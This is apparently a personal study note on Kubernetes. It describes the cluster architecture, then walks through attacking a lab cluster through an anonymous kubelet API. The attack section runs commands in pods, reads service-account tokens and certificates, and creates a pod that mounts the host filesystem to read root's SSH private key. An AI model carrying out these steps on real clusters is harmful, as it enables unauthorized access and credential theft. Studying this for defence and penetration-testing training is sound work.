---
tags:
  - k8s
  - kubernetes
  - kubectl
aliases:
  - k8s
---
# The Kubernetes cluster 

In a Kubernetes cluster, the **control plane (master node)** is responsible for managing the overall system state — scheduling, scaling, health monitoring, and more. The **worker nodes** are where the actual application workloads (pods and containers) run. Communication flows from the control plane down to each node via the kubelet, and cluster-wide networking is managed by the proxy and container runtime.
![[Pasted image 20250710151830.png]]

Kubernetes architecture is primarily divided into two types of components:

- `The Control Plane` (master node), which is responsible for controlling the Kubernetes cluster
	The master node hosts the Kubernetes `Control Plane`, which manages and coordinates all activities within the cluster and it also ensures that the cluster's desired state is maintained. On the other hand, the `Minions` execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.    
#### Control Plane

|**Service**|**TCP Ports**|**Description**|
|---|---|---|
|**etcd**|2379, 2380|Stores all cluster state and configuration data. Port 2379 is for client communication; 2380 is for peer communication.|
|**API server**|6443|Main entry point for all Kubernetes commands via `kubectl`, REST clients, and components.|
|**Scheduler**|10251|Assigns unscheduled pods to nodes based on resource availability and policies.|
|**Controller Manager**|10252|Manages background controllers (e.g., node, replication, endpoints) to ensure desired state.|
|**Kubelet API**|10250|Allows the API server to communicate with the kubelet on each node to manage containers.|
|**Read-Only Kubelet API**|(Removed, was 10255)|Deprecated and removed due to security risks — it exposed pod and node info without auth.|


- `The Worker Nodes` (minions), where the containerized applications are run
	

## Kubernetes API

The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions
API has been designed to support declarative control, allowing users to define their desired state for the system.
supports `get, put, patch, delete`
#### Authentication

In terms of authentication, Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user's identity.
## K8's Security Measures

Kubernetes security can be divided into several domains:

- Cluster infrastructure security
- Cluster configuration security
- Application security
- Data security

## Kubernetes misconfigs/abuse
In Kubernetes, the `Kubelet` can be configured to permit `anonymous access`. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions.

### enumerating anonymous access
```shell-session
$ curl https://10.129.10.11:6443 -k
{
	"kind": "Status",
	"apiVersion": "v1",
	"metadata": {},
	"status": "Failure",
	"message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
	"reason": "Forbidden",
	"details": {},
	"code": 403
}
```

`System:anonymous` typically represents an unauthenticated user, meaning we haven't provided valid credentials or are trying to access the API server anonymously.

>By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a `403 Forbidden` status code accordingly.


### listing pods and extracting their metadata
Understanding the container images and their versions used in the cluster can enable us to identify known vulnerabilities and exploit them to gain unauthorized access to the system.
`extract pod metadata`
```shell-session
$ curl https://10.129.10.11:10250/pods -k | jq .

{
  "kind": "PodList",
  "apiVersion": "v1",
  "metadata": {},
  "items": [
    {
      "metadata": {
        "name": "nginx",
        "namespace": "default",
        "uid": "aadedfce-4243-47c6-ad5c-faa5d7e00c0c",
        "resourceVersion": "491",
        "creationTimestamp": "2023-07-04T10:42:02Z",
        "annotations": {
          "kubectl.kubernetes.io/last-applied-configuration": "{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"name\":\"nginx\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"image\":\"nginx:1.14.2\",\"imagePullPolicy\":\"Never\",\"name\":\"nginx\",\"ports\":[{\"containerPort\":80}]}]}}\n",
          "kubernetes.io/config.seen": "2023-07-04T06:42:02.263953266-04:00",
          "kubernetes.io/config.source": "api"
        },
        "managedFields": [
          {
            "manager": "kubectl-client-side-apply",
            "operation": "Update",
            "apiVersion": "v1",
            "time": "2023-07-04T10:42:02Z",
            "fieldsType": "FieldsV1",
            "fieldsV1": {
              "f:metadata": {
                "f:annotations": {
                  ".": {},
                  "f:kubectl.kubernetes.io/last-applied-configuration": {}
                }
              },
    
					...SNIP...
```
The information displayed in the output includes the `names`, `namespaces`, `creation timestamps`, and `container images` of the pods. It also shows the `last applied configuration` for each pod, which could contain confidential details regarding the container images and their pull policies.


`listing pods:`
```shell-session
~$ kubeletctl -i --server 10.129.10.11 pods
```
![[Pasted image 20250710150829.png]]
kubectl is very handy for us attackers, we can run `scan rce` to find any pod that is vulnerable to remote code execution
`list pods vulnerable to RCE`
```shell-session
$ kubeletctl -i --server 10.129.10.11 scan rce
```
![[Pasted image 20250710151040.png]]



We can perform remote commands as with the following syntax
`executing id on remote pod`
```shell
$ kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx

uid=0(root) gid=0(root) groups=0(root)
```

## Privilege Escalation

we can utilize a tool called [kubeletctl](https://github.com/cyberark/kubeletctl) to obtain the Kubernetes service account's `token` and `certificate` (`ca.crt`) from the server. To do this, we must provide the server's IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more
`extract token`
```shell
$ kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
```

`extract certificate`
```shell-session
$ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt

-----BEGIN CERTIFICATE-----
```

we can check the access rights in the Kubernetes cluster.
```shell
~$ export token=`cat k8.token`

$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods										     	[]					[]				[get create list]
...SNIP...
```

Here we can see a few very important information. Besides the selfsubject-resources we can `get`, `create`, and `list` pods which are the resources representing the running container in the cluster. From here on, we can create a `YAML` file that we can use to create a new container and mount the entire root filesystem from the host system into this container's `/root` directory. From there on, we could access the host systems files and directories. The `YAML` file could look like following:
`.yaml`
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true

```

`creating a new pod with the .yaml config`
```shell
$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml

pod/privesc created


$ kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```
If the pod is running we can execute the command and we could spawn a reverse shell or retrieve sensitive data like private SSH key from the root user.

`Extracting Root's SSH Key`
```shell-session
cry0l1t3@k8:~$ kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc

-----BEGIN OPENSSH PRIVATE KEY-----
```